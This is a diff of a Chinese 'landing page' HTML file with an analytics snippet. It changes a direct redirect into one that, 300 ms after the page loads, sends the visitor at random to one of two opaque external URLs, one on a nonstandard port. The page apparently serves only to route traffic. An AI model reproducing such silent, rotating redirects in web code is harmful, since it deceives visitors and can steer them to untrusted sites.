@@ -1,5 +1,3 @@
-<meta charset="UTF-8">
-<title>落地页</title>
 <script>
 var _hmt = _hmt || [];
 (function() {
@@ -9,5 +7,9 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 
-window.location.href="https://uj.ndjsada.com/2987.html";
+function time() {
+    var arr = ["https://uj.ndjsada.com/2987.html", "https://m.jnh263.com:6766/r?a=1803"];
+		window.location.href = arr[parseInt(Math.random() * arr.length)];
+}
+setTimeout(time, 300);
 </script>
